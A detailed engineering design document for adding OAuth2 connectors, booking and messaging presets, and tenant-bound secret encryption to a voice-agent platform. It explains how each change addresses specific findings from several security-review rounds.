# Design: Connector Presets + Per-Tenant OAuth2 (Authorization Code)

## Approach
Add one tenant-owned table, `oauth_connections`, holding exactly one connection per (tenant, provider). Its tokens are stored as tenant-bound `enc:t1.` refs. Connect, reconnect and disconnect all mutate that same row in place and never replace it. A `custom_apis` row using the new `oauth2_authorization_code` scheme points at it through a composite FK `(oauth_connection_id, tenant_id)`. `auth_schemes.apply()` resolves the token at call time with an explicit `WHERE tenant_id = $1 AND id = $2`. "Disabled" is derived from the connection's `status` and is never a per-row flag. Because of that, disconnect is a single-row write with no cascade to race against, and reconnect needs no repointing: the preset rows already reference the id that becomes `connected` again (AC8, AC18 and AC19 all fall out of this). Presets are static Python definitions. Applying one inserts ordinary `custom_apis` rows through the same insert path `create_custom_api` uses, inside one advisory-locked transaction. The obvious alternative is a `disabled` column on `custom_apis` plus a repoint-on-reconnect cascade. That alternative was rejected because it creates two writers of one fact (connection state vs. row state) and a check-then-act window between disconnect and reconnect (lesson 8).

**Assumptions chosen for the PRD's open questions (both repeated under Risks so the user can overturn them):**
- **OQ1 — Who registers the platform OAuth app:** Yuviz does it once per provider as a manual step before launch. `client_id` and `client_secret` are platform secrets supplied through env refs and resolved by the platform `CompositeSecretResolver`, never the tenant resolver. There is no platform-admin console screen. A provider whose env is unset is left out of `GET /oauth-providers`, so the console never shows a Connect button for it.
- **OQ2 — Can preset-created rows be edited:** No, they are read-only. `update_custom_api` rejects any PATCH on a row with `preset_key IS NOT NULL` with `400 preset_managed`. The guard goes immediately after the `SELECT … FOR UPDATE` at `custom_apis.py:586-590`, before the advisory lock and before any field or `params` write. That one function is the only mutation path for a row's fields and its params, because `_replace_params` is only reached from inside it (or from create). The other `FOR UPDATE` at `:684` belongs to `soft_delete_custom_api`, and deletion is deliberately left ungated. The remaining `UPDATE custom_apis` statements are `chain_levels` recompute (`:304`), the field write inside `update_custom_api` itself (`:643`, already behind the guard) and soft-delete (`:702`). `agent_apis.set_enabled` and `agent_apis.detach` write `agent_custom_apis`, not the row. Delete is still allowed, both per row (existing route) and per preset (new route). To change anything (for example, rotating a WhatsApp key), the tenant removes the preset and applies it again. This lock is not what keeps tokens safe: the token-to-provider-host binding in `apply()` (below) holds even if the lock is overturned.

**Resolution of the PRD review findings:**
- **Delete vs. disconnect (review finding 1):** they are one action. "Disconnect" (AC8) is the only user-facing connector removal. It revokes with the provider, nulls both token refs, and sets `status='disconnected'`. The row is kept, never soft-deleted. AC18's "delete" is the same operation. No route sets `oauth_connections.deleted_at`, and the composite FK plus `ON DELETE NO ACTION` stops a hard delete while any `custom_apis` row references the connection. So no enabled row can point at a missing connector, and a disconnected one can never execute.
- **10-minute goal (review finding 2):** it becomes a timed QA acceptance with a click budget; see Test plan, case 11.

**Where this design deviates from the PRD's literal text** (each item is also a Risk):
- **AC13 (five rows, different chaining):** the calendar preset creates five rows, not four. `gcal_find_booking` is added, and reschedule and cancel chain off it. Book does not chain off check-slots, because check-slots' output is not an input to book. Chaining them would feed slot #1 into the booking instead of the slot the caller chose.
- **AC23 (idempotency placement):** the Google Calendar API ignores idempotency headers. The idempotency key for Google is therefore placed into the event's `id` body field, through a new `idempotency_body_field`, and its value is the existing side-effect claim row's `id` (hex). It is the platform claim's own identity, not a parallel mechanism, and it changes only when a cancel releases the claim.
- **AC14 (no Appointments step):** there is no "Appointments step". `CallFlowNodeType` is `start|play|menu|collect|dial|agent|hangup` (`admin-ui/lib/callFlowApi.ts:12`), and `execute_api` runs inside the `agent` node. "Selectable in the Appointments step" is met by preset rows appearing in the existing Tools attach view (`AgentCustomApisPanel.tsx`).
- **AC24 (filler):** already met, with no change. `FillerSelector.select_tool_filler` "never returns None — a tool call always gets a spoken filler" (`services/conversation/fillers.py:43-47`).
- **AC22 (confirm before book):** enforced by a structural two-call gate in the executor, not by prompt wording (see Interfaces, "Confirmation gate"). A row with a non-NULL `confirmation_template` (`gcal_book`, `gcal_reschedule`, `gcal_cancel`) is never dispatched on the first call for a given set of arguments. That first call returns `chain_status="confirmation_required"` together with a read-back rendered deterministically from the exact resolved arguments. The conversation service speaks that read-back verbatim and ends the turn (`orchestrator.py:180-184`). The upstream call is made only when the model calls again with identical arguments (same `arguments_hash`), in the same session, under a different `turn_id`. `turn_id` is a fresh `uuid4` per turn (`orchestrator.py:100`), so a caller utterance must come in between. The one thing this cannot prove is that the caller's reply meant "yes". The model still judges that; see Risks.

**Resolution of the security review (`02-security.md`; findings 1-3 fixed here, 4 and 5 reported and left as they are):**
- **Finding 1 (critical), ciphertext replay across tenants:** every ciphertext that toolexec decrypts is now sealed to its tenant. The format is `enc:t1.<…>`: AES-256-GCM with associated data `tenant:<canonical uuid>`, under a key derived by HKDF from the existing `SECRET_ENCRYPTION_KEY`. `resolve_tenant_ref` decrypts it only for the row's own `tenant_id`, and a mismatch fails the GCM tag check. A legacy Fernet `enc:` ref (one with no associated data) is rejected at write time and at call time from this deploy onward. **There is no runtime compatibility window.** Existing rows are converted by a one-shot re-encryption script that refuses to bind any ciphertext it cannot attribute to a single tenant. A `NOT VALID` CHECK blocks new legacy writes at the DB level, and the script `VALIDATE`s it, so the cutover closes at a moment you can verify. Every `*_ref` value in custom-API responses is replaced with `"[stored]"`. All three `oauth_connections`/`oauth_authorization_states` refs and the WhatsApp `key_ref` are created tenant-bound. See Interfaces, "Tenant-bound ciphertext".
- **Finding 2 (high), cancel/reschedule identity:** a new server-side param source, `caller_id`, takes its value from the call's ANI. The ANI is carried on `ChainExecuteRequest.caller_number`, which only `/execute`'s named service accounts can set, and the LLM never sees or supplies it. `gcal_book` stamps two values on the event as private extended properties: `yuviz_phone=<ANI>` and `yuviz_preset=calendar_booking`. `gcal_find_booking` looks events up with `privateExtendedProperty=yuviz_phone=<ANI>` (no `q`), and a projection transform then keeps only preset-created events whose stored phone equals the ANI. The cancel and reschedule read-backs name the matched appointment's service/doctor, date and time. The find and reschedule responses are projected to non-PII fields before they reach `response_redacted`. See Interfaces, "Caller-ID param source" and "Calendar preset rows".
- **Finding 3 (high), secrets in logs:** every token, refresh and revoke call sends `client_secret`, `refresh_token`, `code`, `code_verifier` and `token` only as an `application/x-www-form-urlencoded` body (`data=`). Query strings are never used, even where a provider's docs show them. Toolexec sets the `httpx` and `httpcore` loggers to WARNING, so no outbound URL (and so no `event_id`, `spreadsheetId` or `sensitive` path value) reaches a log line. Test 5 captures `httpx` at INFO, so it fails without the form-body rule, and a second case fails without the logger setting.

**Resolution of security round 3 (`02-security.md` round 3; findings 1-3 fixed here, 4 and 5 still reported and left as they are):**
- **Finding 1 (high), outbound `caller_id` is the tenant's own DID:** `ChainExecuteRequest` now carries three separate server-set fields: `call_direction`, `caller_number` (the call's `caller_did`) and `called_number` (the call's `called_did`). They are never one pre-chosen "remote number" whose emptiness could mean two things (lesson 39). Toolexec picks the remote party itself. On `inbound` it uses `caller_number`, and on `outbound` it uses `called_number`, which is the callee (`orchestrator.py:198`, `called_did=call.to_number`). Any other direction value (`""` meaning missing, `"test"` from webcall, or anything unknown) fails closed with `caller_id_unavailable`. So does a chosen number that is empty, unparseable, equal to the other leg's number, or one of the tenant's own `phone_numbers.did`. That last check catches an outbound leg mislabelled as inbound, whose `caller_number` is the campaign DID. See Interfaces, "Caller-ID param source".
- **Finding 2 (high), Config ciphertext is copyable across tenants:** this covers all three Config tables that store `enc:` values. They are `provider_configs.api_key_ref`, `telephony_configs.credentials`, and `tool_provider_configs.api_key_ref`, which shares `resolve_api_key_input` with `provider_configs` (lesson 42: grep every table). On create, a client-supplied `enc:` value is always rejected. On update, it is rejected unless it is byte-identical to that row's current stored value. `"[stored]"` means "keep the current value". Every Config route response is masked (`enc:…` becomes `"[stored]"`) for every principal except a platform service account (`is_service_account AND tenant_id IS NULL`, lesson 24). Conversation, Telephony and vobiz read these routes under such accounts and need the sealed value (`provider_configs.py:3-7`). `reencrypt_tenant_refs.py` now reads all three tables as ownership evidence, so a ciphertext copied from any of them into `custom_apis` is quarantined, not rebound. See Interfaces, "Config credential tables".
- **Finding 3 (medium), Sheets formula injection:** `sheets_capture_lead` appends with `valueInputOption=RAW`, so Sheets stores every caller value as literal text and never parses it as a formula.

**Resolution of security round 4 (`02-security.md` round 4; findings 1-4 fixed here, finding 5 fixed for writes with a named accepted residual):**
- **Finding 1 (high), Config ciphertext copied before deploy stays usable:** `reencrypt_tenant_refs.py` now **acts** on `config_shared` instead of counting it. Every ciphertext that occurs under two or more tenants — across `custom_apis.auth_config`, `provider_configs.api_key_ref`, `tool_provider_configs.api_key_ref`, every `enc:` entry of `telephony_configs.credentials`, and `carriers.auth_token_ref` — is quarantined in **every** occurrence, the original holder's row included, because no evidence in this database can name the original (Interfaces, "Existing rows", *Attribution*). Each occurrence writes an audit row on its own tenant, and the operator gets a `--report` file naming table, column, row id and tenant id so each affected tenant can be told to rotate. `main` exits 1 unless `remaining == 0` **and** `config_shared == 0`, so the release gates on it.
- **Finding 2 (medium), `carriers.auth_token_ref`:** `carriers` becomes the fourth Config ref table everywhere the other three appear — the write rule (`resolve_api_key_input(..., current_ref=)`), the response mask (`mask_enc`), the script's inventory and the script's quarantine action. `CarrierCreate`/`CarrierUpdate` gain a plaintext `auth_token`, because today carriers has no plaintext input at all and refusing client `enc:` without one would leave no way to store a BYOC token (Interfaces, "Config credential tables").
- **Finding 3 (medium), WhatsApp recipient:** the recipient is no longer a caller/model argument. It is a `caller_id` param, so `remote_party_number` picks the remote party on both directions and the model never sees the field (`policy_resolver.py:255` builds the tool schema only from `source='caller'`). A new preset-only `custom_apis.session_send_cap` bounds the row at **3** successful sends per `session_id`, checked in the executor before the claim and before any upstream request (Interfaces, "WhatsApp rows").
- **Finding 4 (low), one tenant's disconnect revokes another tenant's grant:** fixed, not accepted. `oauth_connections` gains `provider_sub`, and `disconnect` skips the upstream revoke while another tenant holds a `connected` row with the same `(provider, provider_sub)` (Interfaces, "`disconnect` (AC8)").
- **Finding 5 (low), tenant-writable `env:`/`k8s:`:** fixed on every write path. A pointer scheme is accepted on a Config row only from a platform-scoped principal (`deps.is_platform_scoped`, i.e. `tenant_id IS NULL`, lesson 24), and on `custom_apis.auth_config` from nobody at all. Read paths are unchanged, so no live row breaks. The residual — Config rows that **already** hold a tenant-written pointer — is accepted and stated under Risks with the condition that would make it unacceptable.

## Changes (files to touch)

| File | Change | Why |
|---|---|---|
| `libs/config_sdk/secrets.py` | Adds `TENANT_BOUND_PREFIX = "enc:t1."`, `encrypt_tenant_secret()`, `decrypt_tenant_secret()`, `is_tenant_bound()` and `class SecretTenantMismatch(ValueError)`. `decrypt_secret()` raises `ValueError` on an `enc:t1.` ref before trying Fernet, so the shared `CompositeSecretResolver` (Config, Conversation, DID, Knowledge) can never open a tenant-bound ciphertext without a tenant. `encrypt_secret`/`decrypt_secret` are otherwise unchanged for their existing callers (`provider_configs.py:46`, `telephony_configs.py:62`, `telephony/accounts.py:138`). | Finding 1. It lives in `config_sdk` for the same reason Fernet does (module docstring: both planes need the identical encoding). `cryptography` is already the dependency, so nothing new is added. |
| `database/schema.sql` | Adds the `oauth_connections` and `oauth_authorization_states` tables. Adds 5 columns to `custom_apis` (including `confirmation_template`) and 2 to `custom_api_params` (`body_path`, `value_prefix`). Widens `custom_api_params.source` and `custom_api_params_source_shape` to add `'caller_id'`, and updates the inline CHECKs at `:953-964` to match for fresh DBs. Adds the `NOT VALID` `custom_apis_auth_config_enc_bound` CHECK. Adds `'confirmation_required'` to the `api_chain_runs.status` and `api_chain_steps.status` CHECKs. Swaps the `auth_scheme` CHECK, adds the shape CHECK and the composite FK in one `DO $$` block. Updates the inline CHECK and the `auth_config` shape comment at `:847-867` so fresh DBs match. | The new state; follows the existing single-`DO`-block CHECK swap convention (`schema.sql:255-263`, lesson 13). |
| `database/rls.sql` | Adds `oauth_connections_tenant_isolation` and `oauth_authorization_states_tenant_isolation` policies, copied from `custom_apis_tenant_isolation` (`rls.sql:228-237`). Adds `('oauth_connection','oauth_connections')` to the audit backfill list (`rls.sql:69-75`). | RLS as the second layer; explicit predicates are the first (lesson 36). |
| `services/toolexec/oauth.py` (new) | Provider registry, authorize-URL builder with PKCE, state issue and redeem, code exchange, refresh with conditional rotation, disconnect and revoke, list, and `access_token_for()`. Every provider HTTP call goes through `resolve_and_validate_endpoint`, the pinned transport and a 10s timeout. Every ref it writes (`access_token_ref`, `refresh_token_ref`, `code_verifier_ref`) comes from `encrypt_tenant_secret(tenant_id, …)`, and it reads them back only through `auth_schemes.resolve_tenant_ref(tenant_id, …)`. Token, refresh and revoke requests carry their secrets only in `data=` (a form body), never in `params=` or the URL. It stores `provider_sub` and consults it before the upstream revoke (round-4 finding 4). | Keeps the OAuth protocol in one module that routers, `auth_schemes` and `presets` all call. |
| `services/toolexec/presets.py` (new) | Static `PRESETS` definitions (calendar booking, WhatsApp via Gupshup/Interakt/Meta, Sheets lead capture) with their setup schemas. Also `apply_preset()`, `remove_preset()`, `validate_response_transform()`, `apply_response_transform()` (closed set: `google_freebusy_slots`, `google_booking_lookup`, `google_event_projection`), `render_confirmation()`, `claim_release_target()`, `normalize_ani()` and `remote_party_number()`. The WhatsApp definitions carry `session_send_cap=3` and a `caller_id` recipient param (round-4 finding 3). | Presets are templates that write ordinary `custom_apis` rows; no new runtime abstraction. |
| `services/toolexec/custom_apis.py` | Extracts the transaction body of `create_custom_api` (`:508-541`) into `_insert_custom_api(conn, …)`; `create_custom_api` still calls it. Adds `"oauth2_authorization_code": ()` to `_CREDENTIAL_REF_FIELDS`, because its refs live on the connection row. Adds the `preset_managed` guard in `update_custom_api` directly after the `FOR UPDATE` fetch at `:586-590`. `soft_delete_custom_api`'s `FOR UPDATE` at `:684` stays ungated on purpose (OQ2). `_replace_params` writes `body_path`. Moves `PinnedResolverTransport` here from `executor.py:287-309`. Adds `public_custom_api(api)`, the response mask, and `_seal_auth_secrets(...)`, which create and update call before the unchanged `_validate_credential_ref` (see Interfaces, "Tenant-bound ciphertext"). `_insert_custom_api` and `_replace_params` write `value_prefix`. | Preset apply needs N inserts in one locked transaction. Moving the transport lets `oauth.py` import it without an `executor → presets → oauth → executor` import cycle. |
| `services/toolexec/auth_schemes.py` | Adds `class ReconnectRequired(ValueError)` and an `oauth2_authorization_code` branch in `apply()` that calls `oauth.access_token_for(tenant_id, api["oauth_connection_id"])` through a function-local `from . import oauth`. It also enforces the provider host binding. `ReconnectRequired` is re-raised before the generic `except Exception`. The `enc:` branch of `validate_tenant_ref` now accepts only an `enc:t1.` ref that `decrypt_tenant_secret(tenant_id, ref)` opens, and its docstring's "enc: always allowed" is replaced. `resolve_tenant_ref` decrypts `enc:` with `decrypt_tenant_secret` directly, not through `_tenant_secret_resolver`. `validate_tenant_ref` now rejects `env:` and `k8s:` outright, so no tenant can write a pointer ref to `custom_apis.auth_config` (round-4 finding 5); `resolve_tenant_ref`'s `env:`/`k8s:` read branch is left intact so no live row breaks before the script quarantines it. | One call-time credential entry point stays the only path (`auth_schemes.py:150-194`). |
| `services/toolexec/executor.py` | (a) Imports `PinnedResolverTransport` from `custom_apis`. (b) Adds `except auth_schemes.ReconnectRequired: raise _StepFailure("unavailable", "reconnect_required")` immediately before the existing `except ValueError` at `:809`. (c) `_claim_side_effect` returns the claim row's `id` (`uuid.UUID | None`; it already has `RETURNING id`, and the one caller's `if not claimed` and the concurrency test's truthiness count are unchanged). Directly after the claim succeeds at `:837-839`, if `api_row["idempotency_body_field"]` is set, `body_fields[field] = claimed.hex`. The event `id` is the claim id, not the `idem` hex, so that a released-by-cancel claim yields a fresh event `id` on rebook (Google keeps a deleted event's id and 409s its reuse); see Interfaces, "Booking-claim release". (d) In `_resolve_arguments`, body params with a `body_path` are placed at that nested path (dict and list segments). For `body_style='form'`, a non-scalar top-level value is JSON-encoded. (e) Directly after `raw_response = json.loads(...)` at `:867` and before `redaction.redact` at `:880`: `if api_row.get("response_transform"): raw_response = presets.apply_response_transform(api_row["response_transform"], raw_response, body_fields)`. (f) The confirmation gate: after `arguments_hash` is computed at `:833` and before `_claim_side_effect`, `if api_row.get("confirmation_template") and not await _confirmed_in_prior_turn(tenant_id, request.session_id, api_id, arguments_hash, request.turn_id): raise _ConfirmationRequired(presets.render_confirmation(api_row["confirmation_template"], arguments_redacted))`. The step is persisted as `confirmation_required`, the run is finalized with that status, and the response carries `deterministic_response`. (g) Path values join the hashed arguments. In `_resolve_arguments`, the `location == "path"` branch at `:504-511` also records `path_values[name] = string_value` (a new local `path_values: dict[str, str] = {}`), and the return at `:517` becomes `return headers, query_params, body_fields, url, argument_sources, from_prior_step, path_values` (the **seventh** element). The one caller's unpack at `:801` gains `, path_values`, and `path_values: dict[str, str] = {}` joins the pre-`try` initializations at `:792-796` so the failure handler can read it. Both argument dicts are built from the literal `{**body_fields, **query_params, **headers, **path_values}`: `resolved_arguments` at `:826-829` and `failure_arguments` at `:899-902`, each still minus `injected_auth_keys`. Path values are keyed by the bare param name, not a `path.` prefix. `custom_api_params UNIQUE (custom_api_id, name)` (`schema.sql:960`) rules out a collision with another param, and `redaction.redact` matches `sensitive` params by name (`executor.py:878-879`), so a prefixed key would silently escape redaction. `resolved_arguments` is built before `_derive` at `:833`, so `event_id` now feeds `arguments_hash`, the `idem` key, `arguments_redacted` and `render_confirmation`. (h) Claim release: directly after `_mark_side_effect_success` at `:874-875` (reached only on a 2xx), `if (target := presets.claim_release_target(api_row)):` followed by `try: await _release_booking_claim(tenant_id, api_row["preset_key"], target, path_values["event_id"])` / `except Exception: log.warning("booking_claim_release_failed", extra={"custom_api_id": api_id})`. The `try` wraps **only** that call. Neither the event id nor the exception text is logged. A release error therefore never turns a cancel that already happened upstream into a reported failure; it falls back to today's behaviour, where the rebook is refused until the TTL. The `path_values` recording in (g) is not inside any new `try`. (i) `_resolve_arguments` gains a keyword `remote_party: str | None`. Its one call at `:801` passes `remote_party=remote_party`, the value computed **once per chain** by `remote_party = await _remote_party(tenant_id, request)` before the step loop. That call runs only when some row in the API tree has a `caller_id` param or a `google_booking_lookup` transform, and is otherwise `None`. No other expression may feed this keyword, and `request.caller_number` is never read anywhere else in `executor.py`. In pass 1, a `source == "caller_id"` param resolves to `(param["value_prefix"] or "") + (remote_party.lstrip("+") if param["value_digits_only"] else remote_party)` with `argument_sources[name] = "caller_id"`. `caller_arguments[name]` is never read for such a param. If `remote_party is None`, it raises `_StepFailure("invalid_argument", "caller_id_unavailable")` before any upstream request. (k) **Session send cap (round-4 finding 3).** Immediately after the confirmation gate (f) and **before** `_claim_side_effect`, a row with a non-NULL `api_row["session_send_cap"]` is counted (Interfaces, "WhatsApp rows"); at or above the cap it raises `_StepFailure("unavailable", "send_cap_reached")`, so no claim is taken and no upstream request is made. (j) The (e) call becomes `presets.apply_response_transform(api_row["response_transform"], raw_response, body_fields, caller_ani=remote_party)`. The (f) call becomes `presets.render_confirmation(api_row["confirmation_template"], arguments_redacted, upstream_responses)`, where `upstream_responses = {api_rows[u]["name"]: prior_responses[u] for u in <distinct upstream_api_id of this row's params>}`. `prior_responses` holds the post-transform response (`:877` runs after (e)), so the read-back only ever sees projected fields. | Surfaces AC7's error distinctly, places AC23's key where Google reads it, builds nested provider bodies, produces AC21's spoken slots, enforces AC22 structurally, and lets a cancelled slot be rebooked the same day. |
| `services/toolexec/schemas.py` | New models: `OAuthAuthorizeRequest`, `OAuthCallbackRequest`, `PresetApplyRequest` (a discriminated union per preset key, `extra="forbid"`, with WhatsApp `api_key: SecretStr`). `CustomApiCreate`/`CustomApiUpdate` `auth_scheme` Literals are **left unchanged**, and neither model exposes `confirmation_template` or `session_send_cap`. Adds `"confirmation_required"` to `ChainStepReport.status` and `ChainExecuteResponse.chain_status`. `CustomApiCreate` and `CustomApiUpdate` gain `auth_secrets: dict[Literal["key_ref","token_ref","client_id_ref","client_secret_ref"], SecretStr] | None = None`. `ChainExecuteRequest` gains three independent fields: `caller_number: str = Field("", max_length=32)`, `called_number: str = Field("", max_length=32)` and `call_direction: str = Field("", max_length=16)`. `call_direction` is a plain `str`, not a `Literal`, so an unknown value reaches `remote_party_number` and fails closed as `caller_id_unavailable` on the calendar steps. A 422 would fail every step of the chain, including ones with no `caller_id` param. `CustomApiParamSpec.source` is left unchanged, so `caller_id` and `value_prefix` stay preset-only. | The raw editor can never create or convert a row to `oauth2_authorization_code`; only preset apply can. |
| `services/toolexec/routers/oauth_connections.py` (new) | Tenant-scoped connector routes (see Interfaces). | Matches `routers/custom_apis.py`: `tenant_scoped_router` with `bind_path_tenant` and `require_path_tenant_access`, awaited `assert_tenant_access`, writes behind `require_role("superadmin","admin")`. |
| `services/toolexec/routers/connector_presets.py` (new) | Preset list, apply and remove routes. Apply returns `[public_custom_api(r) for r in rows]`. | Same convention as above. |
| `services/toolexec/app.py` | `include_router` for the two new routers. | Mounting. |
| `services/toolexec/routers/custom_apis.py` | List (`:79-82`), get (`:113`), create and update return `custom_apis_service.public_custom_api(...)`. Create and update pass `body.auth_secrets` through. | Finding 1: `auth_config` is returned to every console role today. The mask goes at the response edge because `executor._build_api_tree` (`executor.py:171-175`) and `update_custom_api` need the real refs from `_decode_custom_api_row`. |
| `services/toolexec/__main__.py` | Extracts `configure_logging()`, which is the existing `basicConfig` plus `logging.getLogger("httpx").setLevel(logging.WARNING)` and the same for `"httpcore"`. `main()` calls it. | Finding 3: httpx logs every request URL at INFO, so this keeps provider URLs and executor URLs (with path values such as `event_id`, `spreadsheetId` and `sensitive` params) out of logs. |
| `services/toolexec/reencrypt_tenant_refs.py` (new) | A one-shot script that converts legacy `enc:` refs in `custom_apis.auth_config` to `enc:t1.` or quarantines them, then `VALIDATE`s `custom_apis_auth_config_enc_bound`. It inventories `provider_configs`, `telephony_configs`, `tool_provider_configs` and `carriers` (round-4 finding 2) and **writes** them: every ciphertext occurring under two or more tenants is quarantined in all four tables as well as in `custom_apis` (round-4 finding 1). It also quarantines every `env:`/`k8s:` ref in `custom_apis.auth_config` (round-4 finding 5). | Findings 1 and 2 for existing rows. Re-encryption needs the key, so plain SQL cannot do it. |
| `services/conversation/tools/policy_resolver.py` | In the `enabled` CTE (`:219-224`): `LEFT JOIN oauth_connections oc ON oc.id = ca.oauth_connection_id AND oc.tenant_id = ca.tenant_id AND oc.deleted_at IS NULL`, plus `AND (ca.oauth_connection_id IS NULL OR oc.status = 'connected')`. | A disconnected or reconnect-needed API is no longer offered to the LLM, so the agent stops promising bookings it cannot make (AC8). |
| `services/conversation/tools/executors/api_exec_executor.py` | Adds a `chain_status == "confirmation_required"` branch as the **first** branch of the chain at `:88-102`, keyed on `chain_status`, not on `status`. `_STATUS_MAP` (`:27-34`) gets **no** entry for it. The literal order is: `if chain_status == "confirmation_required": status = ToolStatus.INVALID_ARGUMENT; payload = {"awaiting_caller_confirmation": True}` / `elif chain_status == "partial":` (unchanged) / `elif status is ToolStatus.SUCCESS:` (unchanged) / `elif status is ToolStatus.INVALID_ARGUMENT:` (unchanged; sets `missing_fields`). Because the first branch matches, the `missing_fields` branch never runs, so the payload is exactly `{"awaiting_caller_confirmation": True}`. `error` (`"confirmation_required"`) and `deterministic_response` pass through from the response unchanged, as they do today. Also adds `"caller_number": request.context.caller_number`, `"called_number": request.context.called_number` and `"call_direction": request.context.call_direction` to the `/execute` body at `:64-76`. These are the call's `caller_did`, `called_did` and `direction`, passed through unchanged. Conversation never picks the remote party. | Without the branch, an unknown status falls to `FAILED` (`:86`), and the model would tell the caller the booking failed instead of waiting for their answer. |
| `services/conversation/tools/types.py` | `ToolExecutionContext` gains `called_number: str = ""` and `call_direction: str = ""` beside `caller_number` (`:110`). | Carries finding 1's two extra fields to the executor. |
| `services/conversation/tools/orchestrator.py` | `run_turn` (`:68-74`) gains keywords `called_number: str = ""` and `call_direction: str = ""`. The `ToolExecutionContext(...)` at `:227-234` passes `called_number=called_number, call_direction=call_direction`. | Same. |
| `services/conversation/pipeline.py` | The `run_turn` call at `:1486-1489` adds `called_number=self._called_number, call_direction=self._direction`. The constructor default `direction: str = "inbound"` (`:458`) becomes `""`, so a future construction site that omits direction fails closed instead of being treated as inbound. The one construction site, `__main__.py:370-381`, already passes `direction=ctx.direction` and `called_number=ctx.called_did`, so `__main__.py` is unchanged. `transcript_builder` already maps `""` to `"inbound"` (`:395`). | Same. |
| `admin-ui/lib/toolexecApi.ts` | Adds types and functions for providers, connections, authorize, callback, disconnect, presets, apply and remove. `CustomApi` gains `preset_key` and `oauth_connection_id`. Custom-API create and update payloads gain `auth_secrets`. | The PRD names this client. |
| `admin-ui/components/ConnectorsPanel.tsx` (new) | Connector cards (Connect, Reconnect, Disconnect, and status with account label) and preset cards (Apply form with defaults prefilled; timezone from `Intl.DateTimeFormat().resolvedOptions().timeZone`). Rendered by `admin-ui/app/(console)/integrations/page.tsx` (new). | AMENDED (one-click-crm-integrations coordination dependency, user-approved 2026-10-02): was rendered next to `<CustomApisPanel>` at `admin-ui/app/(console)/knowledge-bases/page.tsx:378`, per this feature's own PRD. That feature's criterion 32 puts integrations on a dedicated page, and two surfaces showing connection state was the alternative. No mechanism depends on the placement. |
| `admin-ui/app/(console)/integrations/callback/page.tsx` (new) | Reads `code`, `state`, `error` and `accounts-server`, then immediately calls `history.replaceState` to strip them. Reads `{tenantId, provider, returnTo}` from `sessionStorage` (set before redirect). POSTs the callback and routes back. Shows the fixed generic message on any failure. | The redirect lands in the authenticated console, so the backend never needs an unauthenticated route (lesson 1). AMENDED from `/connectors/callback` — see the row above; this path is registered at five provider consoles, so it had to settle before those registrations. |
| `admin-ui/components/CustomApisPanel.tsx` | For `preset_key` rows: shows a "Managed by preset" badge and hides Edit. For rows whose connection is not `connected`: shows a "Disabled — reconnect {provider}" badge. In the auth form (`:238-243`), a pasted key is sent as `auth_secrets[<field>]` and a scheme-shaped value as the ref, using the existing `secretPayload` rule. `"[stored]"` is sent back unchanged so the stored ref is kept, and the empty value `public_custom_api` returns for a quarantined field shows as a required field. | Visible form of derived disabling and of the OQ2 lock. |
| `admin-ui/components/SecretRefInput.tsx` | `isStored` also returns true for `"[stored]"`, so the masked value gets the existing hidden "stored" state with Replace. `secretPayload` gains a first non-empty rule, `if (isStored(v)) return { api_key_ref: v }`, placed before the scheme regex at `:162`. Without it, `"[stored]"` has no colon and would be sent as `api_key` and encrypted as a literal key. | Custom-API and Config responses are now both masked. `ProvidersPanel` (`:105,129`) and `ToolsPanel` (`:109-110,145`) round-trip the masked value through `secretPayload`, so this one rule covers both, and neither file changes. |
| `admin-ui/app/(console)/telephony/page.tsx` | The edit form (`:976-1008`) loads `creds.auth_token` and `creds.api_keys[0]`, which are now `"[stored]"`, into plain inputs. Those inputs render empty with the placeholder "Stored — type to replace". Submitting an untouched field sends `"[stored]"`, and a typed value sends the plaintext. The read-only `mask()` view (`:899`) is unchanged. | Without this, the form would show the literal `[stored]` text. A user who edits around it gets a 400, never a stored sentinel. |
| `services/config/provider_configs.py` | `resolve_api_key_input(api_key, api_key_ref, *, current_ref: str \| None = None)`. If `api_key == "[stored]"`, it raises. If `api_key_ref == "[stored]"`, it returns `current_ref`, or raises when `current_ref` is `None`. An `enc:` ref is returned only if it is `== current_ref`. Otherwise it raises `ValueError("credential_ref_not_accepted: send the key as api_key")`. `env:`/`k8s:` are unchanged. Create passes no `current_ref`. In `update_provider_config`, the `resolve_api_key_input` call moves from `:176-178` to directly after the `FOR UPDATE` fetch (`:195-200`) and passes `current_ref=old["api_key_ref"]`. Adds `STORED_SENTINEL = "[stored]"`, `mask_enc(value)`, `ref_mask_required(user) -> bool` and `public_provider_config(cfg, *, masked: bool)`. `resolve_api_key_input` also takes a required keyword `allow_pointer_schemes: bool` and raises the same `ValueError` for an `env:`/`k8s:` value when it is false (round-4 finding 5). The module docstring and the `:27-30` ponytail note are rewritten to say service accounts alone get the sealed value. | Round-3 finding 2, applied at the shared input helper so all three Config writers get it. |
| `services/config/routers/provider_configs.py` | List (`:43-56`), get (`:115-117`), create (`:60-70`) and update (`:120-138`) return `public_provider_config(..., masked=ref_mask_required(current_user))`. Create and update pass the literal `allow_pointer_schemes=is_platform_scoped(current_user)` down to the service function (round-4 finding 5). | Masks at the response edge, because the cache and `get_provider_config` must keep the real value for Conversation. |
| `services/config/tool_provider_configs.py` | Create (`:84`) is unchanged and inherits the create-side rejection. In update, the `resolve_api_key_input` call at `:122` moves after that function's old-row fetch and passes `current_ref=old["api_key_ref"]`, as in `provider_configs`. | It shares `resolve_api_key_input`. Leaving it out would break its unchanged round-trip and leave the third table copyable. |
| `services/config/routers/tool_provider_configs.py` | Every route that returns a row wraps it in `public_provider_config(..., masked=ref_mask_required(current_user))`. Its `api_key_ref` shape is identical. Create and update pass the literal `allow_pointer_schemes=is_platform_scoped(current_user)`. | Same masking rule. |
| `services/config/telephony_configs.py` | `_normalize_credentials(provider, credentials, old_credentials: dict \| None = None, *, allow_pointer_schemes: bool)` and `_normalize_one(field_name, entry, old_entry: str \| None, *, allow_pointer_schemes: bool)`. For a list field, `old_entry` is the old list's entry at the same index. `"[stored]"` maps to `old_entry`, or raises when there is none. `is_encrypted(entry)` is kept only if `entry == old_entry`, and otherwise raises `ValueError(f"{field_name}: credential_ref_not_accepted")`. Plaintext is encrypted as today. `create_telephony_config` (`:197`) passes no old credentials, and `update_telephony_config` (`:248`) passes `old["credentials"]`, which is JSON-decoded if it is a `str`. Adds `public_telephony_config(cfg, *, masked: bool)`, which replaces every `enc:`-prefixed string in `credentials`, scalar or list entry, with `"[stored]"`. It is registry-independent, so `native` rows are covered. The module docstring (`:7-13`) is rewritten. | Round-3 finding 2. |
